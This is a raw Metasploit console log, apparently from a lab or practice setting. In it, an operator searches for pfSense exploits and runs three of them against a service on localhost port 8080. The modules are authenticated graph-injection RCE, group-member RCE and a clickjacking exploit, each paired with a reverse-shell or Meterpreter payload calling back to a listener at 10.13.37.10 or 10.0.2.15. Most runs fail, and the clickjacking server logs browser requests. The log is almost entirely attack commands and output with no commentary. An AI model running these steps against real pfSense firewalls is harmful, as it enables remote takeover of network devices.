┌──(kali㉿kali)-[~]
└─$ msfconsole
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,                                                                                                                                    
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,                                                                                                                                 
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:                                                                                                                               
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,                                                                                                                             
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo                                                                                                                            
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk                                                                                                                           
 oMMMMMMMMMMx.                    dMMMMMMMMMMx                                                                                                                          
.WMMMMMMMMM:                       :MMMMMMMMMM,                                                                                                                         
xMMMMMMMMMo                         lMMMMMMMMMO                                                                                                                         
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;                                                                                                                  
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:                                                                                                                   
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:                                                                                                                     
xMMMMMMMMMd                        ,0MMMMMMMMMMK;                                                                                                                       
.WMMMMMMMMMc                         'OMMMMMM0,                                                                                                                         
 lMMMMMMMMMMk.                         .kMMO'                                                                                                                           
  dMMMMMMMMMMWd'                         ..                                                                                                                             
   cWMMMMMMMMMMMNxc'.                ##########                                                                                                                         
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v6.0.30-dev                          ]
+ -- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Open an interactive Ruby terminal with 
irb

msf6 > search pfsense

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     No     Clickjacking Vulnerability In CSRF Error Page pfSense
   1  exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE
   2  exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE


Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/http/pfsense_group_member_exec

msf6 > use 2
[*] Using configured payload cmd/unix/reverse_openssl
msf6 exploit(unix/http/pfsense_group_member_exec) > show options

Module options (exploit/unix/http/pfsense_group_member_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          no        Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  admin            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse_openssl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/http/pfsense_group_member_exec) > set lhost 10.13.37.10
lhost => 10.13.37.10
msf6 exploit(unix/http/pfsense_group_member_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(unix/http/pfsense_group_member_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(unix/http/pfsense_group_member_exec) > run

[*] Started reverse double SSL handler on 10.13.37.10:4444 
[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number
[*] Exploit completed, but no session was created.
msf6 exploit(unix/http/pfsense_group_member_exec) > use 1
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/http/pfsense_graph_injection_exec) > show options

Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          yes       Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  admin            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/http/pfsense_graph_injection_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set lhost 10.13.37.10
lhost => 10.13.37.10
msf6 exploit(unix/http/pfsense_graph_injection_exec) > run

[*] Started reverse TCP handler on 10.13.37.10:4444 
[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number
[*] Exploit completed, but no session was created.
msf6 exploit(unix/http/pfsense_graph_injection_exec) > use 2
[*] Using configured payload cmd/unix/reverse_openssl
msf6 exploit(unix/http/pfsense_group_member_exec) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 exploit(unix/http/pfsense_group_member_exec) > show options

Module options (exploit/unix/http/pfsense_group_member_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          no        Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     8080             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  admin            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse_openssl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.13.37.10      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/http/pfsense_group_member_exec) > run

[*] Started reverse double SSL handler on 10.13.37.10:4444 
[-] Exploit aborted due to failure: unexpected-reply: 127.0.0.1:8080 - Did not respond to authentication request
[*] Exploit completed, but no session was created.
msf6 exploit(unix/http/pfsense_group_member_exec) > use 1
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 exploit(unix/http/pfsense_graph_injection_exec) > run

[*] Started reverse TCP handler on 10.13.37.10:4444 
[*] Detected pfSense 2.4.2-RELEASE, uploading intial payload
[-] Failed to upload payload...
[*] Exploit completed, but no session was created.
msf6 exploit(unix/http/pfsense_graph_injection_exec) > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/http/pfsense_clickjacking) > show options

Module options (exploit/unix/http/pfsense_clickjacking):

   Name       Current Setting      Required  Description
   ----       ---------------      --------  -----------
   SRVHOST    0.0.0.0              yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080                 yes       The local port to listen on.
   SSL        false                no        Negotiate SSL for incoming connections
   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  https://192.168.1.1  yes       The base path to the web application
   URIPATH                         no        The URI to use for this exploit (default is random)


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   pfSense <= 2.4.1


msf6 exploit(unix/http/pfsense_clickjacking) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/http/pfsense_clickjacking) > 
[*] Started reverse TCP handler on 10.0.2.15:4444 
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).

msf6 exploit(unix/http/pfsense_clickjacking) > set TARGETURI http://localhost:8080
TARGETURI => http://localhost:8080
msf6 exploit(unix/http/pfsense_clickjacking) > set SRVPORT 8888
SRVPORT => 8888
msf6 exploit(unix/http/pfsense_clickjacking) > run
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/http/pfsense_clickjacking) > 
[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Using URL: http://0.0.0.0:8888/hz44ob
[*] Local IP: http://10.0.2.15:8888/hz44ob
[*] Server started.
[*] 127.0.0.1        pfsense_clickjacking - GET /hz44ob Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
[*] 127.0.0.1        pfsense_clickjacking - GET /hz44ob/cookieconsent.min.css Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
[*] 127.0.0.1        pfsense_clickjacking - GET /hz44ob/cookieconsent.min.js Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
[*] 127.0.0.1        pfsense_clickjacking - GET /hz44ob/background.jpg Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

msf6 exploit(unix/http/pfsense_clickjacking) > 
msf6 exploit(unix/http/pfsense_clickjacking) > 
msf6 exploit(unix/http/pfsense_clickjacking) > 
